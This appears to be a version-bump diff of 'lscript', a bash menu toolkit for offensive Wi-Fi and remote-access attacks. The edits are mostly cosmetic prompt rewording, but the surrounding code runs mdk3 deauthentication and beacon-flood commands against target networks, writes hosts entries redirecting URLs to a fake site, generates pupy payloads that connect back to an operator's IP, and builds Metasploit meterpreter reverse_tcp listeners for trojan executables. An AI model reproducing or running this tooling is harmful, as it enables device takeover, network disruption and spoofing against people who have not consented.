@@ -1,5 +1,5 @@
 #! /bin/bash
-VERSION=1.9.3.2
+VERSION=1.9.4
 HOWMANYTOOLS=22
 BACKL="0"
 #############DEFAULTS###############
@@ -21,8 +21,10 @@ BACKL="0"
 	READAK="read -n 1 -r"
 #path for lscript
 	LPATH="/root/lscript"
+	export LPATH
 #path for keyboard shortcuts
 	KSPATH=""$LPATH"/ks"
+	export KSPATH
 #making sure the kspath is set
 	if [ ! -d "$KSPATH" ]
 	then
@@ -153,7 +155,7 @@ function set_interface_number
 {
 while true
 do
-#~ echo -e "Enter the number of your wireless card(etc type "$YS"0"$CE" if wlan0): " 
+#~ echo -e "Enter the number of your wireless card(e.g: type "$YS"0"$CE" if wlan0): " 
 #~ read INUMB
 #~ echo -e "So your wireless interfaces are wlan$INUMB and wlan"$INUMB"mon?"$YNYES": "
 #~ read INTCONFNUMB
@@ -175,9 +177,9 @@ do
 	#~ $READAK	
 	#~ break
 #~ fi
-echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode.(etc:"$YS"wlan0"$CE"): "
+echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode.(e.g:"$YS"wlan0"$CE"): "
 read MANAGED
-echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode.(etc:"$YS"wlan0mon"$CE"): "
+echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode.(e.g:"$YS"wlan0mon"$CE"): "
 read MONITOR
 	echo $MANAGED > "$LPATH"/wlan.txt
 	echo $MONITOR > "$LPATH"/wlanmon.txt
@@ -253,7 +255,7 @@ then
 fi
 clear
 echo -e "Enter the keyboard shortcut that will open "$TITLE" from lscript's main menu"
-echo -e "(etc: "$YS""$TITLE""$CE")"
+echo -e "(e.g: "$YS""$TITLE""$CE")"
 echo -e "To delete it , type:   "$YS"delete"$CE""
 echo -e ""$YS"back"$CE") Go back"
 read CHECKKS
@@ -1265,7 +1267,7 @@ then
 		echo -e "Enter your gateway:"
 		read GATENM
 		echo -e ""
-		echo -e "Enter the gateway's interface(etc: wlan0):"
+		echo -e "Enter the gateway's interface(e.g: wlan0):"
 		read GATEINT
 		#~ if [ "$GATEINT" = "" ]
 		#~ then
@@ -1291,7 +1293,7 @@ then
 		echo -e "Enter your gateway:"
 		read GATENM
 		echo -e ""
-		echo -e "Enter the gateway's interface(etc: wlan0):"
+		echo -e "Enter the gateway's interface(e.g: wlan0):"
 		read GATEINT
 		#~ if [ "$GATEINT" = "" ]
 		#~ then
@@ -1330,7 +1332,7 @@ then
 		echo -e "One of this/these:"
 		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
 		read -e SERVIP
-		echo -e "Enter the interface of that IP(etc: wlan0):"
+		echo -e "Enter the interface of that IP(e.g: wlan0):"
 		read -e INTIP
 		if [ -f ""$LPATH"/HOSTS/hosts.txt" ]
 		then
@@ -1341,7 +1343,7 @@ then
 		while true
 		do
 		clear
-		echo -e "Enter the URL you want to redirect your IP from(etc: thisis.myfakesite.com):"
+		echo -e "Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):"
 		read -e URL
 		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
 		sleep 0.2
@@ -1643,7 +1645,7 @@ function wifi_tools
 		then
 
 			clear
-			echo -e "Enter your site(etc iownthissite.com): "
+			echo -e "Enter your site(e.g: iownthissite.com): "
 			echo -e "(without www)"
 			read -e SITEDOS
 			clear
@@ -1672,7 +1674,7 @@ function wifi_tools
 		read -e MDBSSID
 		echo -e "Enter your target's channel: "
 		read -e MDCHANN
-		echo -e "Enter frames per second(etc 50): "
+		echo -e "Enter frames per second(e.g: 50): "
 		read -e FPS
 		clear
 		xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'		
@@ -1687,7 +1689,7 @@ function wifi_tools
 		read -e MDESSID
 		#~ echo -e "Enter your target's channel: "
 		#~ read -e MDCHANN
-		echo -e "Enter frames per second(etc 50): "
+		echo -e "Enter frames per second(e.g: 50): "
 		read -e FPS
 		clear
 		xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
@@ -1851,7 +1853,7 @@ function remote_access
 		#~ echo -e "Open a new terminal and type:"
 		#~ echo -e "msfconsole"
 		#~ echo -e "use exploit/multi/handler"
-		#~ echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. ETC FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
+		#~ echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. E.G: FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
 		#~ echo -e "set lhost <YOUR IP HERE>"
 		#~ echo -e "set lport 4444"
 		#~ echo -e "exploit"
@@ -1899,10 +1901,10 @@ function remote_access
 			echo -e "Enter your ip: "
 			read -e PUPYIP
 			clear
-			echo -e "Enter your port(etc: 443): "
+			echo -e "Enter your port(e.g: 443): "
 			read -e PUPYPORT
 			clear
-			echo -e "Enter the full output path(etc: /root/Desktop/payload1.exe)"
+			echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
 			read -e PUPYPATH
 			cd /root/pupy/pupy
 			./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
@@ -1983,7 +1985,7 @@ function metasploit_menu
 		echo -e ""
 		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
 		read TARCH
-		echo -e "Enter the name of the payload(etc "$YS"trojan2"$CE"): "
+		echo -e "Enter the name of the payload(e.g: "$YS"trojan2"$CE"): "
 		read ATEXE
 		ATEXEPATH="/root/Desktop/'$ATEXE'.exe"
 		clear
@@ -2015,7 +2017,7 @@ function metasploit_menu
 		read PAYL
 		if [ "$PAYL" != "n" ]
 		then
-			echo -e "Name of listener(etc: "$YS"john"$CE") : "
+			echo -e "Name of listener(e.g: "$YS"john"$CE") : "
 			read NAMEL
 			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
 			echo "set PAYLOAD windows/meterpreter/reverse_tcp " >> "$LPATH"/rc/"$NAMEL".rc
@@ -2062,7 +2064,7 @@ function metasploit_menu
 			sleep 2
 			PAYLOADL="windows/meterpreter/reverse_tcp"
 		fi
-		echo -e "Name of listener(etc: "$YS"john"$CE") : "
+		echo -e "Name of listener(e.g: "$YS"john"$CE") : "
 		read NAMEL
 		echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
 		echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
@@ -2086,7 +2088,7 @@ function metasploit_menu
 		do
 		clear
 		ls "$LPATH"/rc
-		echo -e "Enter the name of the above listener(s) you want to select(etc: "$YS"john"$CE")"
+		echo -e "Enter the name of the above listener(s) you want to select(e.g: "$YS"john"$CE")"
 		echo -e ""$YS"back"$CE") Go back"
 		read NAMERC
 		clear
@@ -2181,6 +2183,10 @@ function update_lscript
 			cd "$LPATH"
 			chmod +x install.sh
 			clear
+			if [ -d /root/lscriptold/lscript/ks ]
+			then
+				cp /root/lscriptold/lscript/ks "$LPATH"
+			fi
 			echo -e "Ok , everything seems to be fine by now."
 			sleep 1
 			echo -e "A new terminal will open, and then the new install.sh will run to update the lscript.I will close."
